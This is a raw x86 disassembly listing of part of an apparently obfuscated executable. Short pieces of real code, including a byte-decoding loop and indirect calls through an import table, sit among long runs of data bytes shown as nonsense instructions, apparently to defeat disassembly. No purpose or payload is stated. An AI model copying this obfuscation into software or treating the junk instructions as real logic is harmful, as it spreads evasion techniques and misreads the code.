  410972:	push   edi
  410973:	mov    WORD PTR fs:[ecx+0x33],es
  410977:	pop    ebp
  410978:	sar    BYTE PTR ds:0x241fd3c5,0x5
  41097f:	push   esp
  410980:	dec    ecx
  410981:	cmc    
  410982:	popf   
  410983:	xor    esp,ebp
  410985:	jmp    0x410985
  410987:	xor    ebx,edx
  410989:	jae    0x410919
  41098b:	inc    esi
  41098c:	fld    TBYTE PTR [eax+0x3c]
  41098f:	cs pop ss
  410991:	ss iret 
  410993:	dec    ecx
  410994:	jae    0x236901e9
  41099a:	into   
  41099b:	lods   eax,DWORD PTR ds:[esi]
  41099c:	call   0xa240885c
  4109a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109a2:	lahf   
  4109a3:	lods   al,BYTE PTR ds:[esi]
  4109a4:	fwait
  4109a5:	dec    ecx
  4109a6:	inc    esp
  4109a7:	pop    eax
  4109a8:	adc    DWORD PTR [esi],eax
  4109aa:	hlt    
  4109ab:	adc    al,0x72
  4109ad:	fcmovnu st,st(7)
  4109af:	scas   eax,DWORD PTR es:[edi]
  4109b0:	sbb    dh,BYTE PTR [ecx+0x2b]
  4109b3:	les    edx,FWORD PTR [ecx-0x2a869c24]
  4109b9:	aad    0x1c
  4109bb:	and    bh,BYTE PTR [esi+0x2]
  4109be:	lods   al,BYTE PTR ds:[esi]
  4109bf:	mov    dl,0xfa
  4109c1:	mov    al,ds:0x849601f1
  4109c6:	cld    
  4109c7:	or     DWORD PTR [eax],0xb4ddc60e
  4109cd:	mov    BYTE PTR [eax-0x294a4c49],dl
  4109d3:	(bad)
  4109d6:	enter  0x28b3,0x7d
  4109da:	push   es
  4109db:	sub    eax,0xcd08f238
  4109e0:	pop    ds
  4109e1:	xor    BYTE PTR [eax],0x57
  4109e4:	cli    
  4109e5:	and    DWORD PTR [esp+edi*8-0x54],edi
  4109e9:	sub    eax,0x3cdc9114
  4109ee:	dec    edx
  4109ef:	ficomp WORD PTR [edi]
  4109f1:	mov    esi,0xb3bbbaac
  4109f6:	jmp    0x4109ce
  4109f8:	shl    esp,1
  4109fa:	mov    edi,DWORD PTR ss:[ebx+0x7db5e977]
  410a01:	sub    BYTE PTR [edx-0x7764a6c7],al
  410a07:	nop
  410a08:	jb     0x410a31
  410a0a:	lods   al,BYTE PTR ds:[esi]
  410a0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a0c:	daa    
  410a0d:	call   0x770a747c
  410a12:	cmp    eax,0xbbec7b61
  410a17:	ds jge 0x4109e2
  410a1a:	xor    DWORD PTR [ebx+0xd2038e5],esp
  410a20:	inc    esi
  410a21:	jno    0x410a3f
  410a23:	adc    BYTE PTR [ebp+ebx*1+0x28ce7076],dl
  410a2a:	out    dx,eax
  410a2b:	lea    esp,[edx+0x6]
  410a2e:	xchg   edx,eax
  410a2f:	adc    DWORD PTR [ebp+0x24],esp
  410a32:	fisub  DWORD PTR [ecx-0x30f7811f]
  410a38:	jp     0x410a2e
  410a3a:	adc    bl,BYTE PTR [edi]
  410a3c:	cmp    ebp,esp
  410a3e:	jmp    0xaeba:0x4785339a
  410a45:	mov    dh,0x57
  410a47:	push   es
  410a48:	xor    eax,0x5867bb87
  410a4d:	sbb    ebp,DWORD PTR ds:0x5a06d1be
  410a53:	outs   dx,DWORD PTR ds:[esi]
  410a54:	mov    eax,0xf89c8532
  410a59:	pop    edi
  410a5a:	pop    esi
  410a5b:	leave  
  410a5c:	ret    0xc
  410a5f:	push   ebp
  410a60:	mov    ebp,esp
  410a62:	mov    eax,DWORD PTR [ebp+0xc]
  410a65:	xor    edx,edx
  410a67:	mov    ecx,0x7264fca9
  410a6c:	div    ecx
  410a6e:	mov    ecx,DWORD PTR [ebp+0x10]
  410a71:	and    ecx,eax
  410a73:	or     ecx,0x81161d8f
  410a79:	mov    eax,ecx
  410a7b:	pop    ebp
  410a7c:	ret    0x18
  410a7f:	push   ebp
  410a80:	mov    ebp,esp
  410a82:	sub    esp,0x58
  410a85:	xor    DWORD PTR ds:0x4337e7,ecx
  410a8b:	mov    ecx,DWORD PTR [ebp+0x8]
  410a8e:	movzx  eax,WORD PTR ds:0x4337bf
  410a95:	sbb    eax,DWORD PTR ds:0x433843
  410a9b:	mov    ds:0x4337bf,eax
  410aa0:	mov    eax,0x8a3c
  410aa5:	xor    ax,WORD PTR [ecx+0x20]
  410aa9:	and    DWORD PTR ds:0x4337b7,0x4337ff
  410ab3:	mov    ecx,0x3b02
  410ab8:	add    ax,cx
  410abb:	and    DWORD PTR ds:0x4337af,0x7f6b
  410ac5:	movzx  eax,ax
  410ac8:	xor    DWORD PTR ds:0x433767,0x6006
  410ad2:	mov    DWORD PTR [ebp-0xc],eax
  410ad5:	mov    BYTE PTR [ebp-0x1],0x7f
  410ad9:	adc    ecx,0x1b78
  410adf:	lea    eax,[ebp-0x1]
  410ae2:	mov    DWORD PTR [ebp-0x10],eax
  410ae5:	adc    ecx,DWORD PTR ds:0x4337f7
  410aeb:	mov    al,BYTE PTR [ebp-0x1]
  410aee:	mov    ecx,DWORD PTR [ebp-0x10]
  410af1:	xor    al,0x46
  410af3:	sub    al,0x38
  410af5:	adc    DWORD PTR ds:0x43372b,0x433737
  410aff:	mov    BYTE PTR [ecx],al
  410b01:	xor    eax,eax
  410b03:	xor    eax,DWORD PTR ds:0x43372b
  410b09:	sbb    DWORD PTR ds:0x433773,eax
  410b0f:	jmp    0x410cab
  410b14:	add    DWORD PTR [ecx-0x1ca338a4],eax
  410b1a:	mov    eax,ds:0xb67bce41
  410b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b20:	sub    eax,0xda70c6e
  410b25:	inc    esi
  410b26:	jle    0x410ba6
  410b28:	icebp  
  410b29:	jg     0x410ba9
  410b2b:	jle    0x410b0a
  410b2d:	mov    cl,0xff
  410b2f:	xchg   esi,eax
  410b30:	mov    bl,0x16
  410b32:	sbb    edx,DWORD PTR [eax+0x3a1d314d]
  410b38:	lods   al,BYTE PTR ds:[esi]
  410b39:	add    DWORD PTR [esi],ebp
  410b3b:	popf   
  410b3c:	mov    cl,0xb5
  410b3e:	in     al,dx
  410b3f:	cmp    al,0x3f
  410b41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b42:	test   eax,0x7a7c33fd
  410b47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b48:	stc    
  410b49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b4a:	add    eax,0x7e4e9369
  410b4f:	stc    
  410b50:	pop    eax
  410b51:	(bad)  
  410b52:	mov    ch,0xf0
  410b54:	es repz popa 
  410b57:	mov    ch,0x8a
  410b59:	adc    al,0xc8
  410b5b:	jg     0x410b2a
  410b5d:	pop    ecx
  410b5e:	pop    esp
  410b5f:	test   al,0x3d
  410b61:	jmp    FWORD PTR [eax]
  410b63:	and    al,0xb0
  410b65:	inc    esi
  410b66:	or     BYTE PTR [esi+eax*8],bl
  410b69:	mov    al,0xdf
  410b6b:	xor    al,0xfb
  410b6d:	repnz imul ebp,DWORD PTR [eax],0x67a10562
  410b74:	fistp  DWORD PTR [edx]
  410b76:	jbe    0x410bf3
  410b78:	mov    edi,esp
  410b7a:	fld    DWORD PTR [esp+edi*2-0x6d63efd8]
  410b81:	xor    al,0x5c
  410b83:	pop    ss
  410b84:	push   esp
  410b85:	and    DWORD PTR [edx+0x2b],eax
  410b88:	stc    
  410b89:	out    0x6d,al
  410b8b:	fnstenv [edx]
  410b8d:	mov    al,ds:0xd20b4a70
  410b92:	sbb    dh,dh
  410b94:	imul   esi,DWORD PTR [ecx],0x16f399e5
  410b9a:	sbb    dl,dl
  410b9c:	(bad)  
  410b9d:	fstp   st(5)
  410b9f:	or     eax,DWORD PTR [ebx+esi*8+0x2a]
  410ba3:	fwait
  410ba4:	jne    0x410bd1
  410ba6:	hlt    
  410ba7:	std    
  410ba8:	mov    al,ds:0xef92d4ee
  410bad:	adc    eax,0xbdcf2bc5
  410bb2:	std    
  410bb3:	push   edx
  410bb4:	(bad)  
  410bb5:	jnp    0x410bed
  410bb7:	cmp    eax,0xf6e38ed8
  410bbc:	pusha  
  410bbd:	mov    bh,0x4f
  410bbf:	cld    
  410bc0:	sbb    BYTE PTR [esi+0x6346a806],ch
  410bc6:	outs   dx,BYTE PTR ds:[esi]
  410bc7:	sahf   
  410bc8:	scas   eax,DWORD PTR es:[edi]
  410bc9:	push   eax
  410bca:	test   BYTE PTR [ebx],cl
  410bcc:	dec    ebp
  410bcd:	dec    eax
  410bce:	adc    dh,BYTE PTR [eax-0x5d]
  410bd1:	mov    DWORD PTR [edx-0x76],esi
  410bd4:	dec    ebp
  410bd5:	stos   DWORD PTR es:[edi],eax
  410bd6:	sub    BYTE PTR [edx],dh
  410bd8:	cld    
  410bd9:	enter  0xd3a2,0xdb
  410bdd:	jmp    0x10a75cce
  410be2:	adc    dl,BYTE PTR [ecx+0x5a70d297]
  410be8:	cmp    DWORD PTR [edx-0x62],0xffffffa6
  410bec:	stos   DWORD PTR es:[edi],eax
  410bed:	xchg   BYTE PTR [eax-0x42],bl
  410bf0:	jle    0x410b87
  410bf2:	mov    es,WORD PTR [esi+0x178c7b7]
  410bf8:	jecxz  0x410bb5
  410bfa:	mov    ss,WORD PTR [eax+0x614f9ee4]
  410c00:	nop
  410c01:	xor    eax,0xc6a85e8f
  410c06:	iret   
  410c07:	push   eax
  410c08:	inc    ecx
  410c09:	push   cs
  410c0a:	cdq    
  410c0b:	int    0x44
  410c0d:	add    eax,0x21ced6e1
  410c12:	int3   
  410c13:	add    eax,0x5a605d45
  410c18:	lahf   
  410c19:	int    0x34
  410c1b:	iret   
  410c1c:	jg     0x410c4a
  410c1e:	cmp    ebp,DWORD PTR [esi]
  410c20:	clc    
  410c21:	push   cs
  410c22:	xor    esi,DWORD PTR [edx+0x3b]
  410c25:	ja     0x410c64
  410c27:	dec    ebp
  410c28:	rcr    BYTE PTR [ebx+eax*1+0x3c],cl
  410c2c:	dec    edx
  410c2d:	mul    DWORD PTR [ecx+0x650afbde]
  410c33:	mov    eax,0x7880fa3a
  410c38:	push   ebp
  410c39:	js     0x92316f6e
  410c3f:	ret    
  410c40:	adc    BYTE PTR [ebx],dl
  410c42:	push   es
  410c43:	(bad)  
  410c44:	neg    DWORD PTR [esi+0x5e]
  410c47:	jle    0x410bfa
  410c49:	sbb    esp,DWORD PTR [ecx+ebx*2]
  410c4c:	and    ah,BYTE PTR [eax]
  410c4e:	inc    edx
  410c4f:	mov    bl,0x35
  410c51:	jae    0x410c60
  410c53:	fs jge 0x410cd4
  410c56:	adc    BYTE PTR [eax+eiz*8-0x7bfdeaa6],bl
  410c5d:	mov    ?,esp
  410c5f:	sahf   
  410c60:	fisttp WORD PTR ds:0x6c9e62c3
  410c66:	jecxz  0x410bf3
  410c68:	mov    ?,esi
  410c6a:	or     DWORD PTR [ebp+ebx*8+0x2f],esp
  410c6e:	aas    
  410c6f:	leave  
  410c70:	scas   al,BYTE PTR es:[edi]
  410c71:	adc    al,0xc5
  410c73:	xor    ebx,DWORD PTR [ecx-0x5a]
  410c76:	loope  0x410c16
  410c78:	aam    0xe5
  410c7a:	xor    edx,ebp
  410c7c:	jecxz  0x410ce0
  410c7e:	adc    al,0x9c
  410c80:	lahf   
  410c81:	mov    WORD PTR [ecx-0x2b],fs
  410c84:	aam    0x71
  410c86:	data16 cmp bl,BYTE PTR [eax+0x59a36f58]
  410c8d:	push   esp
  410c8e:	std    
  410c8f:	or     BYTE PTR [edx+0x68],0x7a
  410c93:	mov    ?,WORD PTR [ecx+0x20e5a3d8]
  410c99:	xchg   ebx,eax
  410c9a:	popf   
  410c9b:	ds adc eax,0xb9edfe1b
  410ca1:	in     al,dx
  410ca2:	pusha  
  410ca3:	push   0x9af4625d
  410ca8:	mov    eax,0x45c726e6
  410cad:	clc    
  410cae:	xor    DWORD PTR [ebp-0x3ff40764],eax
  410cb4:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  410cbb:	mov    eax,DWORD PTR [ebp-0x8]
  410cbe:	or     DWORD PTR ds:0x4337ef,0x3fd0
  410cc8:	mov    ecx,0x7510854
  410ccd:	mov    DWORD PTR ds:0x43372f,0x62c3
  410cd7:	push   esi
  410cd8:	xor    eax,ecx
  410cda:	or     esi,DWORD PTR ds:0x43372f
  410ce0:	mov    esi,0x32729b
  410ce5:	add    eax,esi
  410ce7:	jmp    0x410cfe
  410cec:	mov    dl,BYTE PTR [ebp-0x1]
  410cef:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  410cf3:	mov    DWORD PTR ds:0x43372f,0x530d
  410cfd:	inc    eax
  410cfe:	mov    DWORD PTR ds:0x43376b,0x3584
  410d08:	cmp    eax,0x40
  410d0b:	mov    DWORD PTR ds:0x43377f,0x3d5c
  410d15:	jb     0x410cec
  410d1b:	mov    eax,ds:0x43372f
  410d20:	add    eax,DWORD PTR ds:0x433803
  410d26:	mov    ds:0x43372f,eax
  410d2b:	mov    edx,DWORD PTR [ebp-0x8]
  410d2e:	mov    DWORD PTR ds:0x43383f,0x17
  410d38:	cmp    DWORD PTR ds:0x43383f,0x0
  410d3f:	je     0x410d94
  410d45:	cmp    DWORD PTR ds:0x43383f,0x4
  410d4c:	jne    0x410d69
  410d52:	push   DWORD PTR [ebp-0x20]
  410d55:	push   DWORD PTR [ebp-0x28]
  410d58:	push   DWORD PTR [ebp-0xc]
  410d5b:	push   DWORD PTR [ebp-0x1c]
  410d5e:	push   0x2fed
  410d63:	call   DWORD PTR ds:0x4123b0
  410d69:	cmp    DWORD PTR ds:0x43383f,0x5
  410d70:	jne    0x410d84
  410d76:	xor    eax,eax
  410d78:	xor    eax,DWORD PTR ds:0x43383f
  410d7e:	dec    eax
  410d7f:	mov    ds:0x43383f,eax
  410d84:	mov    eax,ds:0x43383f
  410d89:	dec    eax
  410d8a:	mov    ds:0x43383f,eax
  410d8f:	jmp    0x410d38
  410d94:	mov    eax,DWORD PTR [ebp-0xc]
  410d97:	add    DWORD PTR ds:0x433723,0x2cfa
  410da1:	xor    edx,ecx
  410da3:	sbb    DWORD PTR ds:0x43383b,0x4112
  410dad:	add    edx,esi
  410daf:	mov    DWORD PTR ds:0x4337b3,0x2f1c
  410db9:	cmp    edx,eax
  410dbb:	jmp    0x410f57
  410dc0:	adc    al,0x14
  410dc2:	in     al,0x8b
  410dc4:	in     al,0x6b
  410dc6:	jno    0x410d59
  410dc8:	aad    0x1d
  410dca:	dec    ebx
  410dcb:	add    ah,dh
  410dcd:	jne    0x410d61
  410dcf:	(bad)  [edi+eax*2+0x7ff17e7e]
  410dd6:	jle    0x410e56
  410dd8:	adc    DWORD PTR [edx+ebx*2+0x46],ebx
  410ddc:	data16 mov cs,WORD PTR [ecx-0x74]
  410de0:	ins    DWORD PTR es:[edi],dx
  410de1:	loopne 0x410e27
  410de3:	and    eax,0xcc17ef0b
  410de8:	fidivr WORD PTR [edi-0x71]
  410deb:	adc    al,0x34
  410ded:	jp     0x410e5a
  410def:	xor    al,0x10
  410df1:	les    esi,FWORD PTR [ebx+0x424d2213]
  410df7:	mov    gs,WORD PTR [esi-0x360017]
  410dfd:	test   DWORD PTR [edi+0x4e463b77],esp
  410e03:	jge    0x410e46
  410e05:	or     ah,BYTE PTR [edx+eiz*1]
  410e08:	mov    eax,ds:0x7e86ba82
  410e0d:	pop    ebp
  410e0e:	xor    DWORD PTR [edi],ebp
  410e10:	mov    edx,0x2f9203b1
  410e15:	sub    eax,0x5112dc7a
  410e1a:	outs   dx,DWORD PTR ds:[esi]
  410e1b:	frstor [eax+0x37ac2f9]
  410e21:	inc    ebp
  410e22:	cwde   
  410e23:	mov    al,ds:0xb1757458
  410e28:	lock repnz rcr DWORD PTR [esi+0x50],1
  410e2d:	enter  0xe49a,0x8d
  410e31:	or     eax,0x20969dac
  410e36:	popf   
  410e37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e38:	sbb    cl,BYTE PTR [eax]
  410e3a:	xor    BYTE PTR [ebx+ecx*8],dl
  410e3d:	cmp    al,0xcf
  410e3f:	js     0x410e02
  410e41:	enter  0x21c5,0x2b
  410e45:	mov    ?,WORD PTR [ebx]
  410e47:	mov    cl,0x8c
  410e49:	xor    BYTE PTR [eax-0x72],dh
  410e4c:	sub    al,0x13
  410e4e:	xor    DWORD PTR [edx],eax
  410e50:	jecxz  0x410e85
  410e52:	test   ah,bh
  410e54:	dec    ecx
  410e55:	out    0x57,eax
  410e57:	push   ss
  410e58:	xlat   BYTE PTR ds:[ebx]
  410e59:	sub    bl,BYTE PTR [ebp-0x1244d11a]
  410e5f:	int3   
  410e60:	and    bl,al
  410e62:	ins    DWORD PTR es:[edi],dx
  410e63:	add    al,0x1c
  410e65:	xor    BYTE PTR [edx+0x7e97e97e],al
  410e6b:	and    al,0xa3
  410e6d:	loope  0x410ebe
  410e6f:	inc    ebp
  410e70:	mov    bh,0x1b
  410e72:	xchg   ch,al
  410e74:	cmp    al,0xa3
  410e76:	(bad)  
  410e77:	push   cs
  410e78:	(bad)  
  410e79:	or     BYTE PTR [ebp+0x52],0xc0
  410e7d:	test   BYTE PTR [edi+ecx*4],ch
  410e80:	rcl    BYTE PTR [ebp+0x4344214a],cl
  410e86:	pop    edx
  410e87:	cmp    DWORD PTR [edi],esi
  410e89:	pusha  
  410e8a:	std    
  410e8b:	sub    esi,DWORD PTR [esp+eax*8]
  410e8e:	add    eax,ebx
  410e90:	and    ebp,ebp
  410e92:	imul   esi,esi,0x5f68052
  410e98:	and    BYTE PTR [ebp-0x66],0xef
  410e9c:	sar    ah,cl
  410e9e:	mov    bl,0xb6
  410ea0:	cld    
  410ea1:	push   ds
  410ea2:	rcl    BYTE PTR ds:0xe9646ea7,1
  410ea8:	dec    ebp
  410ea9:	es dec ebx
  410eab:	sbb    BYTE PTR [ebp+0x794f97ce],cl
  410eb1:	mov    ebx,0xfd87b553
  410eb6:	neg    DWORD PTR [ebx+edi*4+0xcfcd1d5]
  410ebd:	sub    bh,BYTE PTR [esi]
  410ebf:	pop    esi
  410ec0:	or     ecx,ebx
  410ec2:	(bad)  
  410ec3:	fdivr  DWORD PTR [edi]
  410ec5:	mov    ecx,0x7cd0374a
  410eca:	lods   eax,DWORD PTR ds:[esi]
  410ecb:	shl    BYTE PTR [edx+0xc9501e0],cl
  410ed1:	cs mov esi,0x92f64b92
  410ed7:	rol    DWORD PTR [ecx+0x61],1
  410eda:	fild   QWORD PTR [ecx]
  410edc:	push   cs
  410edd:	jns    0x410f10
  410edf:	xchg   BYTE PTR [ebx+0x2],bl
  410ee2:	jecxz  0x410f02
  410ee4:	call   0xd339:0xa5a5e815
  410eeb:	es dec eax
  410eed:	push   ecx
  410eee:	(bad)  
  410eef:	iret   
  410ef0:	mov    bh,0x20
  410ef2:	xchg   ebp,eax
  410ef3:	adc    BYTE PTR [esi+ecx*4+0x58a92297],bh
  410efa:	dec    esp
  410efb:	out    0xd0,al
  410efd:	out    dx,al
  410efe:	repz pop ecx
  410f00:	xchg   DWORD PTR [ecx+0x35],edi
  410f03:	inc    ebx
  410f04:	and    BYTE PTR [edi-0x20f4de0],dh
  410f0a:	sbb    eax,0x742db8b5
  410f0f:	repnz sbb DWORD PTR [esi-0x80],esi
  410f13:	sbb    edi,DWORD PTR [edi+ecx*1-0x42]
  410f17:	sti    
  410f18:	sbb    cl,bl
  410f1a:	retf   0x18d2
  410f1d:	push   edx
  410f1e:	mov    dl,0xdd
  410f20:	add    al,0xe0
  410f22:	cmp    eax,0x5c661e6c
  410f27:	cs dec esp
  410f29:	int    0x73
  410f2b:	or     bl,BYTE PTR [esi+eax*1+0x2fb3b3d9]
  410f32:	xlat   BYTE PTR ds:[ebx]
  410f33:	gs call 0x8bb0:0xcc5986f5
  410f3b:	xchg   bh,ah
  410f3d:	or     edx,eax
  410f3f:	cld    
  410f40:	push   edx
  410f41:	out    0xda,eax
  410f43:	or     al,0xb1
  410f45:	mov    bl,ch
  410f47:	fisub  WORD PTR [eax+ebx*8+0x3d6d2d46]
  410f4e:	repz mov ch,BYTE PTR [edi-0x3]
  410f52:	lods   eax,DWORD PTR ds:[esi]
  410f53:	jecxz  0x410ef4
  410f55:	lock fmul QWORD PTR [edi]
  410f58:	test   BYTE PTR [edi+0x2],dl
  410f5b:	add    BYTE PTR [eax],al
  410f5d:	xor    eax,eax
  410f5f:	add    eax,DWORD PTR ds:0x43382f
  410f65:	sub    DWORD PTR ds:0x433833,eax
  410f6b:	push   ebx
  410f6c:	sub    eax,0x37b3
  410f71:	push   edi
  410f72:	mov    DWORD PTR ds:0x43377f,0x14
  410f7c:	cmp    DWORD PTR ds:0x43377f,0x0
  410f83:	je     0x410fda
  410f89:	cmp    DWORD PTR ds:0x43377f,0x2
  410f90:	jne    0x410fac
  410f96:	push   0x4337b3
  410f9b:	push   DWORD PTR [ebp-0x24]
  410f9e:	push   DWORD PTR [ebp-0x24]
  410fa1:	push   0x4a42
  410fa6:	call   DWORD PTR ds:0x4123b4
  410fac:	cmp    DWORD PTR ds:0x43377f,0x3
  410fb3:	jne    0x410fc6
  410fb9:	mov    edi,DWORD PTR ds:0x43377f
  410fbf:	dec    edi
  410fc0:	mov    DWORD PTR ds:0x43377f,edi
  410fc6:	xor    edi,edi
  410fc8:	or     edi,DWORD PTR ds:0x43377f
  410fce:	dec    edi
  410fcf:	mov    DWORD PTR ds:0x43377f,edi
  410fd5:	jmp    0x410f7c
  410fda:	mov    edi,DWORD PTR [ebp+0x8]
  410fdd:	mov    eax,0x8a3c
  410fe2:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410fe7:	jmp    0x411183
  410fec:	mov    dh,0xd4
  410fee:	ja     0x411052
  410ff0:	jne    0x411053
  410ff2:	mov    bl,0xd0
  410ff4:	ins    DWORD PTR es:[edi],dx
  410ff5:	push   edi
  410ff6:	push   ss
  410ff7:	push   ecx
  410ff8:	int3   
  410ff9:	and    al,0xba
  410ffb:	mov    al,ds:0x7e7e450f
  411000:	icebp  
  411001:	jg     0x411081
  411003:	jle    0x410fd4
  411005:	mov    ebx,0x3cebaa1a
  41100a:	xchg   esi,eax
  41100b:	rcl    BYTE PTR [ebp+edi*1+0x70],1
  41100f:	aad    0x67
  411011:	inc    edx
  411012:	push   0x11b815b4
  411017:	adc    al,cl
  411019:	push   ds
  41101a:	xchg   edi,eax
  41101b:	cmp    eax,0x7859659
  411020:	xchg   ecx,eax
  411021:	icebp  
  411022:	enter  0xd212,0xc5
  411026:	dec    edi
  411027:	push   esi
  411028:	aas    
  411029:	xchg   BYTE PTR [eax],ah
  41102b:	in     al,0xc4
  41102d:	dec    edx
  41102e:	xchg   ebx,eax
  41102f:	cmp    BYTE PTR [edi],0xe8
  411032:	lock jb 0x411062
  411035:	scas   al,BYTE PTR es:[edi]
  411036:	xchg   edi,eax
  411037:	cli    
  411038:	ins    DWORD PTR es:[edi],dx
  411039:	in     al,dx
  41103a:	push   edi
  41103b:	push   esp
  41103c:	dec    ebp
  41103d:	fnstenv [edx]
  41103f:	cmc    
  411040:	pop    ebp
  411041:	loopne 0x41105c
  411043:	retf   0x18e0
  411046:	ja     0x4110a2
  411048:	adc    al,0xd7
  41104a:	sar    BYTE PTR [edi],cl
  41104c:	add    al,0xd4
  41104e:	cmp    eax,0xcbe58522
  411053:	(bad)  
  411054:	sbb    al,0x63
  411056:	pop    edi
  411057:	retf   
  411058:	mov    edx,0xa84ad364
  41105d:	(bad)  
  41105e:	fisub  DWORD PTR [edi+eiz*2+0x23e3d449]
  411065:	jno    0x41107f
  411067:	fs adc al,0x41
  41106a:	xor    ebp,esi
  41106c:	call   0xc885b9b2
  411071:	sbb    al,0x54
  411073:	mov    WORD PTR [ecx-0x679a2940],gs
  411079:	adc    BYTE PTR [bx+si+0xd],0x41
  41107e:	clc    
  41107f:	nop
  411080:	or     BYTE PTR [ecx],ch
  411082:	nop
  411083:	and    eax,0x45986754
  411088:	push   eax
  411089:	inc    ebx
  41108a:	add    DWORD PTR [ecx+0x6748df83],ecx
  411090:	xor    ecx,DWORD PTR [eax+0x4b69ffac]
  411096:	sahf   
  411097:	in     eax,0xc
  411099:	test   al,0x29
  41109b:	(bad)  
  41109c:	into   
  41109d:	fs cmp al,0xf8
  4110a0:	xor    ecx,DWORD PTR [ecx+0x4d]
  4110a3:	sbb    al,0x26
  4110a5:	aad    0x24
  4110a7:	nop
  4110a8:	dec    ecx
  4110a9:	(bad)  
  4110aa:	pushf  
  4110ab:	leave  
  4110ac:	pop    ecx
  4110ad:	shr    BYTE PTR [edx-0x5d75d01d],0x1b
  4110b4:	mov    ah,0x16
  4110b6:	jecxz  0x411110
  4110b8:	(bad)
  4110bb:	and    al,0x46
  4110bd:	test   al,0xd3
  4110bf:	es jp  0x4110e3
  4110c2:	pushf  
  4110c3:	mov    al,ds:0xc387912
  4110c8:	scas   al,BYTE PTR es:[edi]
  4110c9:	mov    WORD PTR [ebx+edx*4-0x3b5912e2],cs
  4110d0:	imul   ebx,DWORD PTR [ebx-0x7922495d],0xffffff9e
  4110d7:	sub    edi,DWORD PTR [edx+0x291104d5]
  4110dd:	xchg   esp,eax
  4110de:	mov    esi,0xc60d9197
  4110e3:	pop    edx
  4110e4:	sub    ebx,0xffffffa7
  4110e7:	outs   dx,DWORD PTR ds:[esi]
  4110e8:	mov    ah,0x8e
  4110ea:	cmp    eax,0xca968276
  4110ef:	xor    DWORD PTR [edi],edx
  4110f1:	jb     0x4110b4
  4110f3:	xor    cl,BYTE PTR [edi]
  4110f5:	je     0x411125
  4110f7:	xor    DWORD PTR [esi+0x55],0x904f673a
  4110fe:	sbb    dl,BYTE PTR [esi]
  411100:	(bad)  
  411101:	in     eax,0x1b
  411103:	out    dx,eax
  411104:	loopne 0x4110e9
  411106:	push   0xaf45b084
  41110b:	sub    al,0x7f
  41110d:	daa    
  41110e:	mov    dl,al
  411110:	data16 ins BYTE PTR es:[edi],dx
  411112:	sub    al,0x5b
  411114:	xchg   ecx,eax
  411115:	(bad)  
  411116:	nop
  411117:	pop    esi
  411118:	sbb    bh,BYTE PTR [edi-0x482c42d8]
  41111e:	sar    esi,0xa4
  411121:	xchg   edi,eax
  411122:	dec    ebp
  411123:	jge    0x4110f0
  411125:	jecxz  0x411126
  411127:	sub    BYTE PTR [edi],0x77
  41112a:	imul   ebx,DWORD PTR [ebx+0x534a2527],0x7a
  411131:	cdq    
  411132:	jle    0x41119a
  411134:	shr    BYTE PTR [esi-0x57bf8ce8],0x42
  41113b:	ss jmp 0xb417d8ab
  411141:	gs xchg ebp,ebp
  411144:	pop    DWORD PTR [eax]
  411146:	ror    DWORD PTR [esi+ecx*2-0x338f5eaa],1
  41114d:	adc    dh,BYTE PTR [esp+ebx*2-0x6c]
  411151:	inc    ebx
  411152:	fs scas al,BYTE PTR es:[edi]
  411154:	call   0x6791621a
  411159:	and    al,0x29
  41115b:	jmp    0x4111a2
  41115d:	cs jns 0x41111c
  411160:	rcr    BYTE PTR [edx+edi*4],0xe5
  411164:	xor    al,0x1b
  411166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411167:	inc    edx
  411168:	xor    al,BYTE PTR [ebp-0x2c8e4e89]
  41116e:	push   0x13d223bf
  411173:	xor    BYTE PTR [edx-0x5c],0xa1
  411177:	jmp    0x41117d
  411179:	xor    DWORD PTR [esi-0x42ad3b0a],esi
  41117f:	dec    ebp
  411180:	and    BYTE PTR [ebx-0x3a],ch
  411183:	mov    edi,0x3b02
  411188:	add    ax,di
  41118b:	movzx  eax,ax
  41118e:	mov    DWORD PTR [ebp-0x14],eax
  411191:	mov    eax,DWORD PTR [ebp+0x8]
  411194:	movzx  eax,WORD PTR [eax+edx*4]
  411198:	xor    eax,0x8a3c
  41119d:	add    eax,edi
  41119f:	mov    edi,DWORD PTR [ebp-0x14]
  4111a2:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4111a6:	mov    eax,DWORD PTR [ebp-0xc]
  4111a9:	inc    edx
  4111aa:	cmp    edx,eax
  4111ac:	jne    0x410f72
  4111b2:	pop    edi
  4111b3:	pop    ebx
  4111b4:	mov    eax,DWORD PTR [ebp-0x8]
  4111b7:	mov    edx,DWORD PTR [ebp+0x10]
  4111ba:	xor    eax,ecx
  4111bc:	add    eax,esi
  4111be:	mov    DWORD PTR [edx],eax
  4111c0:	mov    eax,DWORD PTR [ebp-0x8]
  4111c3:	xor    eax,ecx
  4111c5:	add    eax,esi
  4111c7:	mov    DWORD PTR [ebp+0x8],eax
  4111ca:	mov    eax,DWORD PTR [ebp+0x8]
  4111cd:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4111d1:	mov    dl,BYTE PTR [ebp-0x1]
  4111d4:	cmp    al,dl
  4111d6:	je     0x4113b5
  4111dc:	mov    eax,DWORD PTR [ebp+0x8]
  4111df:	jmp    0x41137b
  4111e4:	mov    ah,0x98
  4111e6:	adc    al,ch
  4111e8:	adc    dh,BYTE PTR [ebp+0x71]
  4111eb:	imul   ebx,ebp,0xefdabba7
  4111f1:	pop    edi
  4111f2:	ins    BYTE PTR es:[edi],dx
  4111f3:	sub    al,0x8e
  4111f5:	inc    edx
  4111f6:	jle    0x411276
  4111f8:	icebp  
  4111f9:	jg     0x411279
  4111fb:	jle    0x4111aa
  4111fd:	cmp    BYTE PTR [edi],al
  4111ff:	adc    al,0x9
  411201:	push   ss
  411202:	push   edx
  411203:	fdiv   st,st(4)
  411205:	aaa    
  411206:	shl    DWORD PTR [esi-0x2a23995c],cl
  41120c:	xor    esi,ecx
  41120e:	adc    DWORD PTR [esi],esp
  411210:	jge    0x4111b3
  411212:	hlt    
